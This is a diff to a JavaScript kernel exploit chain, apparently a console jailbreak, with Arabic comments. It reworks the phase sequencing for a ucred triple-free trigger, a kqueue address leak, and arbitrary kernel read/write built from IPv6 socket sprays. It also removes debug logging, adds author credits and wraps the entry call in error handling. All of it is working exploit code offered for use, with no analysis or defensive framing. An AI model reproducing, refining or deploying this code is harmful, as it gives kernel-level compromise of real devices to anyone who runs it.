@@ -995,39 +995,36 @@ function exploit_phase_trigger() {
     return;
   }
   exploit_count++;
-  log('Triggering Retrying... ');
+  log('Triggering Retrying... (' + exploit_count + '/' + MAIN_LOOP_ITERATIONS + ')...');
   if (!trigger_ucred_triplefree()) {
     yield_to_render(exploit_phase_trigger);
     return;
   }
-  yield_to_render(exploit_phase_leak);
   log('Leaking Exploit...');
-  
+  yield_to_render(exploit_phase_leak);
 }
 function exploit_phase_leak() {
   if (!leak_kqueue_safe()) {
-    yield_to_render(exploit_phase_trigger);
     log('[leak_kqueue_safe] failed, retrying...');
-    
+    yield_to_render(exploit_phase_trigger);
     return;
   }
-  yield_to_render(exploit_phase_rw);
   
+  log(' Exploit Read/Write...');
+  log(' Stability by M.ELHOUT...');
+  yield_to_render(exploit_phase_rw);
 }
 function exploit_phase_rw() {
   setup_arbitrary_rw();
-  yield_to_render(exploit_phase_jailbreak);
-  log('Jailbreaking...');
   utils.notify('Jailbreak Success');
   utils.notify('M.ELHOUT');
-  
+  yield_to_render(exploit_phase_jailbreak);
 }
 function exploit_phase_jailbreak() {
   jailbreak();
 }
 function setup_arbitrary_rw() {
   log(' Exploit Read/Write...');
-  log(' Stability by M.ELHOUT...');
 
   // 1) تأكيد إن kq_fdp صالح
   if (kq_fdp.eq(0)) {
@@ -1541,7 +1538,6 @@ function leak_kqueue() {
 
     kq = kqueue();
     if (kq.eq(BigInt_Error)) {
-      log('leak_kqueue: kqueue() failed');
       return false;
     }
 
@@ -1613,7 +1609,6 @@ function kreadslow64_safe(address) {
   debug('kreadslow64_safe: addr=' + hex(address));
 
   if (address.eq(0)) {
-    log('kreadslow64_safe: invalid address 0');
     return BigInt_Error;
   }
 
@@ -1677,7 +1672,6 @@ function kreadslow(addr, size) {
 
   // تأكيد صلاحية triplets[1]
   if (triplets[1] < 0 || triplets[1] >= ipv6_socks.length) {
-    log('kreadslow - invalid triplets[1]');
     return BigInt_Error;
   }
 
@@ -1742,7 +1736,6 @@ function kreadslow(addr, size) {
 
   // تأكيد صلاحية triplets[2]
   if (triplets[2] < 0 || triplets[2] >= ipv6_socks.length) {
-    log('kreadslow - invalid triplets[2]');
     return BigInt_Error;
   }
 
@@ -1816,13 +1809,11 @@ function kreadslow(addr, size) {
   write(new BigInt(iov_sock_1), tmp, 1);
 
   if (leak_buffer.eq(0)) {
-    debug('kreadslow - No valid leak found');
     wait_iov_recvmsg();
     read(new BigInt(iov_sock_0), tmp, 1);
     return BigInt_Error;
   }
 
-  debug('kreadslow - Finding triplets[2]...');
 
   // Find triplet[2].
   for (var retry = 0; retry < 3; retry++) {
@@ -1861,11 +1852,9 @@ function kwriteslow(addr, buffer, size) {
 
   // تأكيد صلاحية triplets[1] و triplets[2] قبل الاستخدام
   if (triplets[1] < 0 || triplets[1] >= ipv6_socks.length) {
-    log('kwriteslow: invalid triplets[1]');
     return BigInt_Error;
   }
   if (triplets[0] < 0 || triplets[0] >= ipv6_socks.length) {
-    log('kwriteslow: invalid triplets[0]');
     return BigInt_Error;
   }
 
@@ -1921,7 +1910,6 @@ function kwriteslow(addr, buffer, size) {
 
   // تأكيد صلاحية triplets[2] قبل الـ free
   if (triplets[2] < 0 || triplets[2] >= ipv6_socks.length) {
-    log('kwriteslow: invalid triplets[2] before free');
     return BigInt_Error;
   }
 
@@ -2386,5 +2374,12 @@ function ipv6_sock_spray_and_read_rop(ready_signal, run_fd, done_signal, signal_
     loop_size: 0 // loop_size
   };
 }
-netctrl_exploit();
-// cleanup();
+try {
+  netctrl_exploit();
+} catch (e) {
+  log('ERROR in netctrl_exploit: ' + e.message);
+  cleanup(true);
+  if (typeof show_fail === 'function') {
+    show_fail();
+  }
+}
